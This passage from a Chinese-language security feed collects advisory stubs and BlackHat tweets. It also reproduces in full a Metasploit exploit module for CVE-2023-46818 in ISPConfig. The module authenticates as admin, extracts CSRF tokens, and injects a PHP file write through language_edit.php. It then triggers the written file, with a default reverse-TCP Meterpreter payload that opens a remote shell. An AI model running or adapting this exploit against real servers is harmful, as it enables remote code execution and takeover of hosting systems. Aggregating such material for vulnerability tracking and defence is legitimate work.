login.</p><p>Patch commit: <a href="https://github.com/n8n-io/n8n/pull/16034">https://github.com/n8n-io/n8n/pull/16034</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-5vj6-wjr7-5v9f&quot;&gt;https://github.com/advisories/GHSA-5vj6-wjr7-5v9f&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>Github Poc</title>
    <link href="http://example.com/2025/06/27/github_1015208117/"/>
    <id>http://example.com/2025/06/27/github_1015208117/</id>
    <published>2025-06-27T14:15:10.325Z</published>
    <updated>2025-06-27T14:15:10.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> </p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-27388</li></ul><p><strong>来源：</strong> <a href="https://github.com/Mahesh-970/CVE-2024-27388_afterpatch">https://github.com/Mahesh-970/CVE-2024-27388_afterpatch</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.whitesource</li><li>gss_rpc_xdr.c</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/27/twitter_1837605125/"/>
    <id>http://example.com/2025/06/27/twitter_1837605125/</id>
    <published>2025-06-27T14:00:29.783Z</published>
    <updated>2025-06-27T14:00:29.779Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 加入#BlackHat秋季培训课程“应用数据科学与人工智能于网络安全（在线）”。这门为期两天的互动课程教授安全专业人士如何利用数据科学技术分析网络和安全数据，揭示宝贵见解。课程内容包括数据准备、特征工程、探索性数据分析、数据可视化、机器学习、模型评估以及大规模实施，全部聚焦于安全相关的问题。立即注册&gt;&gt; <a href="https://t.co/UTq7Zlc057">https://t.co/UTq7Zlc057</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1938588376422056154">https://x.com/BlackHatEvents/status/1938588376422056154</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 加入#BlackHat秋季培训课程“应用数据科学与人工智能于网络安全（在线）”。这门为期两天的互动课程教授安全专业人士如何利用数据科学技术分析网络</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>ISPConfig language_editphp PHP代码注入</title>
    <link href="http://example.com/2025/06/27/github_457305466/"/>
    <id>http://example.com/2025/06/27/github_457305466/</id>
    <published>2025-06-27T13:45:26.208Z</published>
    <updated>2025-06-27T13:45:26.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ISPConfig在3.2.11p1之前的版本中，语言文件编辑器存在PHP代码注入漏洞。当admin_allow_langedit启用时，管理员可以利用此漏洞注入PHP代码。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  prepend Msf::Exploit::Remote::AutoCheck<br>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          An issue was discovered <span class="hljs-keyword">in</span> ISPConfig before <span class="hljs-number">3.2</span>.<span class="hljs-number">11p</span>1. PHP code injection can be achieved <span class="hljs-keyword">in</span> the language file editor <span class="hljs-keyword">by</span> an admin <span class="hljs-keyword">if</span> admin_allow_langedit <span class="hljs-keyword">is</span> enabled.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span> <span class="hljs-comment"># Discovery and PoC</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.include?(<span class="hljs-string">&#x27;ISPConfig&#x27;</span>) &amp;&amp; (res.body.include?(<span class="hljs-string">&#x27;login&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;username&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;password&#x27;</span>))<br>      print_good(<span class="hljs-string">&#x27;ISPConfig installation detected&#x27;</span>)<br>      <span class="hljs-keyword">return</span> CheckCode::Detected<br>    end<br>    CheckCode::Safe<br>  end<br><br>  def authenticate<br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    end<br>    <span class="hljs-keyword">if</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] &amp;&amp; res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>].include?(<span class="hljs-string">&#x27;admin&#x27;</span>) ||<br>       res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    end<br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  end<br><br>  def inject_payload<br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    @payload_file = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;Rex::Text.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    php_payload = payload.encoded<br>    injection = <span class="hljs-string">&quot;&#x27;];file_put_contents(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;,&#x27;&lt;?php <span class="hljs-subst">#&#123;php_payload&#125;</span> ?&gt;&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    end<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @payload_file)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;@payload_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  end<br><br>  def trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    <span class="hljs-comment"># Small delay to ensure the file is written</span><br>    sleep(<span class="hljs-number">1</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; payload_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;PHP payload triggered successfully&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Payload trigger response was unexpected&#x27;</span>)<br>    end<br>  end<br><br>  def cleanup<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> @payload_file<br>    print_status(<span class="hljs-string">&#x27;Cleaning up payload file...&#x27;</span>)<br>    <span class="hljs-comment"># Use the same vulnerability to delete the file</span><br>    injection = <span class="hljs-string">&quot;&#x27;];unlink(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    print_good(<span class="hljs-string">&quot;Payload file <span class="hljs-subst">#&#123;@payload_file&#125;</span> cleaned up&quot;</span>)<br>  end<br><br>  def exploit<br>    authenticate<br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入&lt;/p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/06/27/twitter_3070689907/"/>
    <id>http://example.com/2025/06/27/twitter_3070689907/</id>
    <published>2025-06-27T13:00:28.637Z</published>
    <updated>2025-06-27T13:00:28.632Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 准备好参加在#sectorca举行的#BlackHat创业焦点大赛吧！🌟 这是在充满活力的#网络安全世界中闪耀并展示你突破性想法的绝佳机会。立即报名你的#创业项目，提升知名度，与行业领袖建立联系，加速你的成长。决赛选手将争夺参加2026年Black Hat USA的宝贵席位。别错过这个难以置信的机会——你的创新可能成为焦点 &gt;&gt; <a href="https://t.co/IaqE2rEb17">https://t.co/IaqE2rEb17</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1938577072936354227">https://x.com/BlackHatEvents/status/1938577072936354227</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 准备好参加在#sectorca举行的#BlackHat创业焦点大赛吧！🌟 这是在充满活力的#网络安全世界中闪耀并展示你突破性想法的绝佳机会。立即</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
    <link href="http://example.com/2025/06/27/github_2980499533/"/>
    <id>http://example.com/2025/06/27/github_2980499533/</id>
    <published>2025-06-27T13:00:13.627Z</published>
    <updated>2025-06-27T13:00:13.624Z</updated>
    
